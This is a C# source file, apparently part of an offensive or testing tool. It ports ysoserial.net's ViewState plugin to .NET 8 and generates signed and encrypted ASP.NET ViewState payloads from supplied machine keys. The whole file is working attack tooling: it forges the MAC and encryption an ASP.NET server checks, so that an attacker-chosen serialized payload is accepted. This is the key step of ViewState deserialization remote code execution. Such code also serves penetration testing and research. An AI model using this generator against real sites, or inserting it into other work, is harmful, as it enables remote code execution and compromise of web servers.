using System.Globalization;
using System.Security.Cryptography;
using System.Text;

namespace EchoServer.Helpers;

/// <summary>
/// Generates signed/encrypted ASP.NET ViewState payloads.
/// Ported from ysoserial.net ViewStatePlugin + MachineKeyHelper to .NET 8.
/// Supports both legacy (.NET <= 4.0) and modern (.NET >= 4.5) modes.
/// </summary>
public static class ViewStateGenerator
{
    private static readonly UTF8Encoding SecureUTF8Encoding = new(encoderShouldEmitUTF8Identifier: false, throwOnInvalidBytes: true);

    public static string Generate(
        string unsignedPayload,
        string validationKey,
        string validationAlg,
        string decryptionKey,
        string decryptionAlg,
        string targetPath,
        string appPath,
        string? viewStateUserKey,
        bool isLegacy,
        bool isEncrypted,
        string? generator)
    {
        if (string.IsNullOrEmpty(unsignedPayload))
            throw new ArgumentException("unsigned_payload is required");
        if (string.IsNullOrEmpty(validationKey))
            throw new ArgumentException("validation_key is required");

        if (string.IsNullOrEmpty(validationAlg))
            validationAlg = "HMACSHA256";
        if (string.IsNullOrEmpty(decryptionAlg))
            decryptionAlg = "AES";
        if (string.IsNullOrEmpty(targetPath))
            targetPath = "/";
        if (string.IsNullOrEmpty(appPath))
            appPath = "/";

        byte[] payload = Convert.FromBase64String(unsignedPayload);

        uint parsedGenerator = 0;
        if (!string.IsNullOrEmpty(generator))
        {
            if (uint.TryParse(generator, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out parsedGenerator))
                isLegacy = true;
            else
                throw new ArgumentException("Invalid generator value. Must be hex, e.g. 955733D9");
        }

        if (isLegacy)
        {
            return GenerateLegacy(payload, validationKey, validationAlg, decryptionKey, decryptionAlg, targetPath, appPath, viewStateUserKey, isEncrypted, parsedGenerator);
        }
        else
        {
            return GenerateModern(payload, validationKey, validationAlg, decryptionKey, decryptionAlg, targetPath, appPath, viewStateUserKey);
        }
    }

    private static string GenerateLegacy(
        byte[] payload,
        string validationKey,
        string validationAlg,
        string decryptionKey,
        string decryptionAlg,
        string targetPath,
        string appPath,
        string? viewStateUserKey,
        bool isEncrypted,
        uint parsedGenerator)
    {
        uint pageHashCode = parsedGenerator;

        if (pageHashCode == 0)
        {
            string templateDir = SimulateTemplateSourceDirectory(targetPath);
            string typeName = SimulateGetTypeName(targetPath, appPath);
            int hash = GetNonRandomizedHashCode(templateDir, ignoreCase: true);
            hash += GetNonRandomizedHashCode(typeName, ignoreCase: true);
            pageHashCode = (uint)hash;
        }

        // Build MAC key modifier: pageHash (4 bytes LE) || viewStateUserKey (UTF-16LE)
        byte[] macKeyBytes;
        if (viewStateUserKey != null)
        {
            int count = Encoding.Unicode.GetByteCount(viewStateUserKey);
            macKeyBytes = new byte[count + 4];
            Encoding.Unicode.GetBytes(viewStateUserKey, 0, viewStateUserKey.Length, macKeyBytes, 4);
        }
        else
        {
            macKeyBytes = new byte[4];
        }
        macKeyBytes[0] = (byte)pageHashCode;
        macKeyBytes[1] = (byte)(pageHashCode >> 8);
        macKeyBytes[2] = (byte)(pageHashCode >> 16);
        macKeyBytes[3] = (byte)(pageHashCode >> 24);

        byte[] byteResult;
        if (!isEncrypted)
        {
            byteResult = LegacyGetEncodedData(payload, macKeyBytes, validationKey, validationAlg);
        }
        else
        {
            byteResult = LegacyEncryptAndSign(payload, macKeyBytes, validationKey, validationAlg, decryptionKey, decryptionAlg);
        }

        return Convert.ToBase64String(byteResult);
    }

    /// <summary>
    /// Reimplementation of MachineKeySection.GetEncodedData for legacy mode.
    /// Computes HMAC(validationKey, payload || macKeyModifier) and appends it to the payload.
    /// </summary>
    private static byte[] LegacyGetEncodedData(byte[] payload, byte[] macKeyModifier, string validationKeyHex, string validationAlg)
    {
        byte[] validationKeyBytes = HexToBinary(validationKeyHex)!;

        using var hmac = CreateKeyedHashAlgorithm(validationAlg, validationKeyBytes);

        // The MAC is computed over: payload || macKeyModifier
        byte[] dataToSign = new byte[payload.Length + macKeyModifier.Length];
        Buffer.BlockCopy(payload, 0, dataToSign, 0, payload.Length);
        Buffer.BlockCopy(macKeyModifier, 0, dataToSign, payload.Length, macKeyModifier.Length);

        byte[] signature = hmac.ComputeHash(dataToSign);

        // Result: payload || signature
        byte[] result = new byte[payload.Length + signature.Length];
        Buffer.BlockCopy(payload, 0, result, 0, payload.Length);
        Buffer.BlockCopy(signature, 0, result, payload.Length, signature.Length);

        return result;
    }

    /// <summary>
    /// Reimplementation of MachineKeySection.EncryptOrDecryptData for legacy encrypted mode.
    /// Signs the payload, then encrypts (payload || signature) with the decryption key.
    /// </summary>
    private static byte[] LegacyEncryptAndSign(byte[] payload, byte[] macKeyModifier, string validationKeyHex, string validationAlg, string decryptionKeyHex, string decryptionAlg)
    {
        // First sign
        byte[] signed = LegacyGetEncodedData(payload, macKeyModifier, validationKeyHex, validationAlg);

        // Then encrypt the signed data
        byte[] decryptionKeyBytes = HexToBinary(decryptionKeyHex)!;
        using var algo = CreateSymmetricAlgorithm(decryptionAlg, decryptionKeyBytes);
        algo.GenerateIV();
        byte[] iv = algo.IV;

        using var encryptor = algo.CreateEncryptor();
        byte[] encrypted = encryptor.TransformFinalBlock(signed, 0, signed.Length);

        // Result: IV || encrypted
        byte[] result = new byte[iv.Length + encrypted.Length];
        Buffer.BlockCopy(iv, 0, result, 0, iv.Length);
        Buffer.BlockCopy(encrypted, 0, result, iv.Length, encrypted.Length);

        return result;
    }

    private static string GenerateModern(
        byte[] payload,
        string validationKey,
        string validationAlg,
        string decryptionKey,
        string decryptionAlg,
        string targetPath,
        string appPath,
        string? viewStateUserKey)
    {
        if (string.IsNullOrEmpty(decryptionKey))
            throw new ArgumentException("decryption_key is required for modern (.NET >= 4.5) mode");

        string primaryPurpose = "WebForms.HiddenFieldPageStatePersister.ClientState";

        var specificPurposes = new List<string>
        {
            "TemplateSourceDirectory: " + SimulateTemplateSourceDirectory(targetPath).ToUpperInvariant(),
            "Type: " + SimulateGetTypeName(targetPath, appPath).ToUpperInvariant()
        };

        if (viewStateUserKey != null)
        {
            specificPurposes.Add("ViewStateUserKey: " + viewStateUserKey);
        }

        byte[] byteResult = Protect(
            payload,
            validationKey,
            decryptionKey,
            decryptionAlg,
            validationAlg,
            primaryPurpose,
            specificPurposes.ToArray());

        return Convert.ToBase64String(byteResult);
    }

    // ---- Crypto operations (ported from MachineKeyHelper.cs) ----

    /// <summary>
    /// Protect data using SP800-108 derived keys for encryption and signing.
    /// Ported from MachineKeyHelper.MachineKey.Protect.
    /// </summary>
    private static byte[] Protect(byte[] clearData, string validationKeyHex, string decryptionKeyHex,
        string decryptionAlgName, string validationAlgName, string primaryPurpose, params string[] specificPurposes)
    {
        checked
        {
            using var encryptionAlgorithm = CreateSymmetricAlgorithm(decryptionAlgName);
            encryptionAlgorithm.Key = SP800_108_DeriveKey(HexToBinary(decryptionKeyHex)!, primaryPurpose, specificPurposes);
            encryptionAlgorithm.GenerateIV();
            byte[] iv = encryptionAlgorithm.IV;

            // Use leaveOpen: true so CryptoStream doesn't close the MemoryStream
            var memStream = new MemoryStream();
            memStream.Write(iv, 0, iv.Length);

            using (var encryptor = encryptionAlgorithm.CreateEncryptor())
            using (var cryptoStream = new CryptoStream(memStream, encryptor, CryptoStreamMode.Write, leaveOpen: true))
            {
                cryptoStream.Write(clearData, 0, clearData.Length);
                cryptoStream.FlushFinalBlock();
            }

            using var signingAlgorithm = CreateHashAlgorithm(validationAlgName, HexToBinary(validationKeyHex)!, primaryPurpose, specificPurposes);
            byte[] signature = signingAlgorithm.ComputeHash(memStream.GetBuffer(), 0, (int)memStream.Length);
            memStream.Write(signature, 0, signature.Length);

            byte[] result = memStream.ToArray();
            memStream.Dispose();
            return result;
        }
    }

    // ---- SP800-108 KDF (ported from MachineKeyHelper.cs) ----

    private static byte[] SP800_108_DeriveKey(byte[] keyDerivationKey, string primaryPurpose, params string[] specificPurposes)
    {
        using var hmac = new HMACSHA512(keyDerivationKey);
        GetKeyDerivationParameters(out byte[] label, out byte[] context, primaryPurpose, specificPurposes);
        return SP800_108_DeriveKeyImpl(hmac, label, context, keyDerivationKey.Length * 8);
    }

    private static byte[] SP800_108_DeriveKeyImpl(HMAC hmac, byte[] label, byte[] context, int keyLengthInBits)
    {
        checked
        {
            int labelLength = label?.Length ?? 0;
            int contextLength = context?.Length ?? 0;
            byte[] buffer = new byte[4 + labelLength + 1 + contextLength + 4];

            if (labelLength != 0)
                Buffer.BlockCopy(label!, 0, buffer, 4, labelLength);
            if (contextLength != 0)
                Buffer.BlockCopy(context!, 0, buffer, 5 + labelLength, contextLength);
            WriteUInt32BigEndian((uint)keyLengthInBits, buffer, 5 + labelLength + contextLength);

            int numBytesWritten = 0;
            int numBytesRemaining = keyLengthInBits / 8;
            byte[] output = new byte[numBytesRemaining];

            for (uint i = 1; numBytesRemaining > 0; i++)
            {
                WriteUInt32BigEndian(i, buffer, 0);
                byte[] k_i = hmac.ComputeHash(buffer);
                int numBytesToCopy = Math.Min(numBytesRemaining, k_i.Length);
                Buffer.BlockCopy(k_i, 0, output, numBytesWritten, numBytesToCopy);
                numBytesWritten += numBytesToCopy;
                numBytesRemaining -= numBytesToCopy;
            }

            return output;
        }
    }

    private static void GetKeyDerivationParameters(out byte[] label, out byte[] context, string primaryPurpose, params string[] specificPurposes)
    {
        label = SecureUTF8Encoding.GetBytes(primaryPurpose);

        using var stream = new MemoryStream();
        using var writer = new BinaryWriter(stream, SecureUTF8Encoding);
        foreach (string specificPurpose in specificPurposes)
        {
            writer.Write(specificPurpose);
        }
        context = stream.ToArray();
    }

    private static void WriteUInt32BigEndian(uint value, byte[] buffer, int offset)
    {
        buffer[offset + 0] = (byte)(value >> 24);
        buffer[offset + 1] = (byte)(value >> 16);
        buffer[offset + 2] = (byte)(value >> 8);
        buffer[offset + 3] = (byte)value;
    }

    // ---- Path simulation (ported from ViewStatePlugin.cs) ----

    internal static string SimulateTemplateSourceDirectory(string path)
    {
        string result = path;

        if (!result.StartsWith("/"))
            result = "/" + result;

        if (result.LastIndexOf('.') > result.LastIndexOf('/'))
            result = result[..(result.LastIndexOf('/') + 1)];

        result = RemoveTrailingSlash(result);

        return result;
    }

    internal static string SimulateGetTypeName(string path, string appPath)
    {
        if (!path.StartsWith("/"))
            path = "/" + path;

        string result = path;

        if (!result.ToLower().EndsWith(".aspx"))
            result += "/default.aspx";

        string normalizedAppPath = appPath.ToLower();
        if (!normalizedAppPath.StartsWith("/"))
            normalizedAppPath = "/" + normalizedAppPath;
        if (!normalizedAppPath.EndsWith("/"))
            normalizedAppPath += "/";

        int idx = result.ToLower().IndexOf(normalizedAppPath);
        if (idx >= 0)
            result = result[(idx + normalizedAppPath.Length)..];

        if (result.StartsWith("/"))
            result = result[1..];

        result = result.Replace('.', '_').Replace('/', '_');

        result = RemoveTrailingSlash(result);

        return result;
    }

    private static string RemoveTrailingSlash(string path)
    {
        if (string.IsNullOrEmpty(path))
            return path;

        if (path.Length > 1 && path[^1] == '/')
            return path[..^1];

        return path;
    }

    // ---- GetNonRandomizedHashCode reimplementation ----
    // This is the .NET Framework's deterministic (non-randomized) string hash code.
    // In .NET Framework, string.GetHashCode() was deterministic. In .NET Core+, it's randomized.
    // ASP.NET's StringUtil.GetNonRandomizedHashCode uses the Marvin32 algorithm but the
    // legacy version (used by ViewState) uses the old .NET Framework hash.

    /// <summary>
    /// Reimplementation of System.Web.Util.StringUtil.GetNonRandomizedHashCode.
    /// This matches the .NET Framework's deterministic string hash algorithm.
    /// </summary>
    internal static int GetNonRandomizedHashCode(string s, bool ignoreCase)
    {
        if (ignoreCase)
            s = s.ToLower(CultureInfo.InvariantCulture);

        // This is the .NET Framework x86 string.GetHashCode() algorithm
        unsafe
        {
            fixed (char* src = s)
            {
                int hash1 = 5381;
                int hash2 = hash1;

                int len = s.Length;
                char* pStr = src;

                for (int i = 0; i < len; i++)
                {
                    int c = pStr[i];
                    if (i % 2 == 0)
                        hash1 = ((hash1 << 5) + hash1) ^ c;
                    else
                        hash2 = ((hash2 << 5) + hash2) ^ c;
                }

                return hash1 + (hash2 * 1566083941);
            }
        }
    }

    // ---- Utility methods ----

    public static byte[]? HexToBinary(string data)
    {
        if (string.IsNullOrEmpty(data) || data.Length % 2 != 0)
            return null;

        byte[] binary = new byte[data.Length / 2];
        for (int i = 0; i < binary.Length; i++)
        {
            int high = HexToInt(data[2 * i]);
            int low = HexToInt(data[2 * i + 1]);
            if (high == -1 || low == -1)
                return null;
            binary[i] = (byte)((high << 4) | low);
        }
        return binary;

        static int HexToInt(char h) =>
            h >= '0' && h <= '9' ? h - '0' :
            h >= 'a' && h <= 'f' ? h - 'a' + 10 :
            h >= 'A' && h <= 'F' ? h - 'A' + 10 :
            -1;
    }

    private static KeyedHashAlgorithm CreateKeyedHashAlgorithm(string algName, byte[] key)
    {
        return algName.ToUpperInvariant() switch
        {
            "SHA1" => new HMACSHA1(key),
            "HMACSHA256" => new HMACSHA256(key),
            "HMACSHA384" => new HMACSHA384(key),
            "HMACSHA512" => new HMACSHA512(key),
            "MD5" => new HMACMD5(key),
            _ => new HMACSHA256(key)
        };
    }

    private static SymmetricAlgorithm CreateSymmetricAlgorithm(string algName, byte[]? key = null)
    {
        SymmetricAlgorithm algo = algName.ToUpperInvariant() switch
        {
            "AES" => Aes.Create(),
            "3DES" or "TRIPLEDES" => TripleDES.Create(),
            "DES" => DES.Create(),
            _ => Aes.Create()
        };
        if (key != null)
            algo.Key = key;
        return algo;
    }

    private static HashAlgorithm CreateHashAlgorithm(string algName, byte[] validationKey, string primaryPurpose, string[] specificPurposes)
    {
        byte[] derivedKey = SP800_108_DeriveKey(validationKey, primaryPurpose, specificPurposes);
        return algName.ToUpperInvariant() switch
        {
            "SHA1" => new HMACSHA1(derivedKey),
            "HMACSHA256" => new HMACSHA256(derivedKey),
            "HMACSHA384" => new HMACSHA384(derivedKey),
            "HMACSHA512" => new HMACSHA512(derivedKey),
            "MD5" => new HMACMD5(derivedKey),
            _ => new HMACSHA256(derivedKey)
        };
    }
}
